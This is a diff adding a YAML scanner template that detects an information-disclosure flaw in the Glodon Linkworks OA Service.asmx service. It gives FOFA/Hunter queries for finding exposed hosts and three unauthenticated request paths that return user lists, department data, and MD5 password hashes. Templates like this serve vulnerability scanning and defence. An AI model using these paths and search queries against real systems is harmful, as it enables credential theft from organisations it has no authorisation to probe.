@@ -1,0 +1,44 @@
+id: glodon-linkworks-Service.asmx-disclosure
+
+info:
+  name: 广联达oa Linkworks Service.asmx 敏感信息泄露
+  author: Y3y1ng
+  severity: high
+  verified: true
+  description: |
+    广联达 Linkworks办公OA存在信息泄露，攻击者可通过此漏洞获取网站后台敏感信息。
+    FOFA: body="/Services/Identification/"
+    HUNTER: web.body="/Services/Identification/"
+  reference:
+    - https://mp.weixin.qq.com/s/aZCgwwN6aMwfwu4XBKw3vA
+  tags: glodon,linkworks,disclosure,oa
+  created: 2023/09/18
+
+# Service.asmx泄露地址../Org/service/Service.asmx
+
+rules:
+  r0: #验证用户信息泄露
+    request:
+      method: GET
+      path: /Org/service/Service.asmx/GetAllUsersXml
+    expression: >
+      response.status == 200 &&
+      response.body.bcontains(b"Name") ||
+      response.body.bcontains(b"Sex")
+  r1: #验证公司项目信息泄露
+    request:
+      method: GET
+      path: /Org/service/Service.asmx/GetDeptXml4GEPS
+    expression: >
+      response.status == 200 &&
+      response.body.bcontains(b"DEP_ID") ||
+      response.body.bcontains(b"DEP_NAME")
+  r2: #验证账户密码(MD5)信息泄露
+    request:
+      method: GET
+      path: /Org/service/Service.asmx/GetUserXml4GEPS
+    expression: >
+      response.status == 200 &&
+      response.body.bcontains(b"USR_NAME") ||
+      response.body.bcontains(b"USR_PWDMD5")
+expression:  r0() || r1() || r2()
